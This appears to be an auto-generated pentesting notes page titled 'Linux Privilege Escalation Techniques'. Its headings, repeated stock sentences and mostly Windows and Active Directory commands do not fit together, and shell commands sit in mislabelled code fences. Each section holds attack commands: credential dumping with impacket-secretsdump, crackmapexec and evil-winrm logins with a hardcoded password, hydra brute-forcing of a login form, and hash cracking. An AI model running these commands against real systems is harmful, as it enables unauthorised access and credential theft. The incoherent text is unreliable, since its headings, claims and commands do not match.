---
TitleSEO: "Linux Privilege Escalation Techniques | ZureFX"
TitlePost: "Linux Privilege Escalation Techniques"
Author: "ZureFX"
Description: "Personal notes on Linux Privilege Escalation Techniques. Quick reference for pentesting and CTF challenges."
Keywords: "enumeration, blue team, linux"
URL: "https://zurefx.github.io/notes/note-linux-privilege-escalation-techniques-798.html"
URL_IMAGES: ""
Date: "2025-04-21"
Tags: "Enumeration, Blue Team, Linux"
Section: "notes"
Lang: "en"
main_img: "note-linux-privilege-escalation-techniques-798"
Permalink: "/notes/note-linux-privilege-escalation-techniques-798.html"
BtnLabel: "Read Notes"
Pick: 0
---
## DNS Rebinding

### SSH

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.109.84.118
nmap -sCV -p995,3306,3306 10.37.185.248 -oN scan.txt
```

The kernel version was outdated and vulnerable to a publicly known exploit. The application stored sensitive credentials in an unencrypted configuration file. The backup files contained sensitive information that should not have been accessible.

Token impersonation allowed elevation to SYSTEM privileges on the target. The web application was vulnerable to Server-Side Template Injection (SSTI). The target system was identified as running a vulnerable version of the service.

```bash
crackmapexec smb 10.69.62.113 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.109.25.29 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.34.73.156 -u administrator -p 'P@ssw0rd!' --shares
```

## psexec

### GPP Password

Group Policy Preferences contained encrypted but recoverable credentials. The scheduled task ran with elevated privileges and could be abused for escalation. Lateral movement was facilitated by reusing discovered credentials across services.

```python
crackmapexec smb 10.26.195.148 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.79.14.228 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.81.51.106 -u administrator -p 'P@ssw0rd!' --shares
```

Group Policy Preferences contained encrypted but recoverable credentials. The kernel version was outdated and vulnerable to a publicly known exploit. The scheduled task ran with elevated privileges and could be abused for escalation. The service account had excessive permissions assigned in Active Directory.

```python
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.114.217.77/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The scheduled task ran with elevated privileges and could be abused for escalation. The web application was vulnerable to Server-Side Template Injection (SSTI). The scheduled task ran with elevated privileges and could be abused for escalation. Post-exploitation enumeration revealed a path to domain administrator privileges. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Kali Linux

### NFS

Initial enumeration revealed several interesting open ports on the target. Post-exploitation enumeration revealed a path to domain administrator privileges. The backup files contained sensitive information that should not have been accessible. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.37.165.230
nmap -sCV -p21,995,27017 10.27.171.221 -oN scan.txt
evil-winrm -i 10.121.160.233 -u administrator -p 'P@ssw0rd!'
```

Group Policy Preferences contained encrypted but recoverable credentials. Privilege escalation was possible due to misconfigured sudo permissions. Lateral movement was facilitated by reusing discovered credentials across services. Command injection was possible through unsanitized user input in the search functionality. The target system was identified as running a vulnerable version of the service.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.108.158.162/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## dcomexec

### RPC

```python
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p5432,143,993 10.92.156.113 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

- `SeDebugPrivilege`
- `mimikatz`
- `Unconstrained Delegation`
- `LXD Privilege Escalation`

The service was running without proper input validation, leading to injection vulnerabilities. Unconstrained delegation was enabled on the compromised machine. The web application was vulnerable to Server-Side Template Injection (SSTI). Command injection was possible through unsanitized user input in the search functionality. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
crackmapexec smb 10.118.179.208 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.21.200.237
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.43.10.27
```

## Remote Code Execution

### Golden Ticket

Group Policy Preferences contained encrypted but recoverable credentials. Group Policy Preferences contained encrypted but recoverable credentials. The service was running without proper input validation, leading to injection vulnerabilities.

Initial enumeration revealed several interesting open ports on the target. Privilege escalation was possible due to misconfigured sudo permissions. Weak file permissions allowed modification of critical system files.

```python
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.94.117.245 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.90.21.251 -u administrator -p 'P@ssw0rd!' --shares
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The database credentials were hardcoded in the application source code. Token impersonation allowed elevation to SYSTEM privileges on the target. Authentication bypass was achieved through careful manipulation of the login mechanism. Command injection was possible through unsanitized user input in the search functionality.

The service was running without proper input validation, leading to injection vulnerabilities. Network traffic analysis revealed unencrypted communications containing user credentials. Unconstrained delegation was enabled on the compromised machine.
